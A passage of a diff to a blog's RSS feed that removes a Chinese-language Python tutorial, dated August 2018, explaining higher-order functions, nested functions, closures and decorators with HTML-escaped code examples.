-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fun&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fun&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- 
-&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# 4
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　函数 bar 接收一个参数，这个参数是一个可被调用的函数对象，把函数 foo 传递到 bar 中去时，foo 和 fun 两个变量名指向的都是同一个函数对象，所以调用 fun(3) 相当于调用 foo(3)。&lt;/p&gt;
-
-&lt;h2 id=&quot;嵌套函数&quot;&gt;嵌套函数&lt;/h2&gt;
-
-&lt;p&gt;　　函数不仅可以作为参数和返回值，函数还可以定义在另一个函数中，作为嵌套函数存在，例如：&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
- 
-&lt;span class=&quot;n&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　inner做为嵌套函数，它可以访问外部函数的变量，调用 outer 函数时，发生了3件事：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;给变量 x 赋值为1&lt;/li&gt;
-  &lt;li&gt;定义嵌套函数 inner，此时并不会执行 inner 中的代码，因为该函数还没被调用，直到第3步&lt;/li&gt;
-  &lt;li&gt;调用 inner 函数，执行 inner 中的代码逻辑。&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;闭包&quot;&gt;闭包&lt;/h2&gt;
-
-&lt;p&gt;　　再来看一个例子：&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- 
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;closure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;closure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;　　同样是嵌套函数，只是稍改动一下，把局部变量 x 作为参数了传递进来，嵌套函数不再直接在函数里被调用，而是作为返回值返回，这里的 closure就是一个闭包，本质上它还是函数，闭包是引用了自由变量(x)的函数(inner)。&lt;/p&gt;
-
-&lt;h2 id=&quot;装饰器&quot;&gt;装饰器&lt;/h2&gt;
-
-&lt;p&gt;　　终于到正题了：&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　上面这个函数虽然没什么用，但是能说明问题就行。现在，有一个新的需求，需要在执行该函数时加上日志：&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;记录日志开始&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;记录日志结束&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　功能实现，唯一的问题就是它需要侵入到原来的代码里面，把日志逻辑加上去，如果还有好几十个这样的函数要加日志，也必须这样做，显然，这样的代码一点都不Cooooooool。那么有没有可能在不修改业务代码的提前下，实现日志功能呢？答案就是装饰器。&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;记录日志开始&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 业务函数
-&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;记录日志结束&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt;
- 
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- 
-&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　我没有修改 foo 函数里面的任何逻辑，只是给 foo 变量重新赋值了，指向了一个新的函数对象。最后调用 foo()，不仅能打印日志，业务逻辑也执行完了。现在来分析一下它的执行流程。&lt;/p&gt;
-
-&lt;p&gt;　　这里的 outer 函数其实就是一个装饰器，装饰器是一个带有函数作为参数并返回一个新函数的闭包，本质上装饰器也是函数。outer 函数的返回值是 inner 函数，在 inner 函数中，除了执行日志操作，还有业务代码，该函数重新赋值给 foo 变量后，调用 foo() 就相当于调用 inner()&lt;/p&gt;
-
-&lt;p&gt;　　另外，python为装饰器提供了语法糖@，它用在函数的定义处：这样就省去了手动给foo重新赋值的步骤。&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;outer&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;#即 @outer 等价于 foo = outer(foo)
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　当然，实际使用的装饰器更加复杂，比如可以接受参数的装饰器，基于类的装饰器等等，慢慢学吧&lt;/p&gt;
-</description>
-        <pubDate>Fri, 24 Aug 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018-08-24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%A3%85%E9%A5%B0%E5%99%A8/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018-08-24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%A3%85%E9%A5%B0%E5%99%A8/</guid>
-        
-        <category>python</category>
-        
-        
-        <category>随编</category>
         
       </item>
     
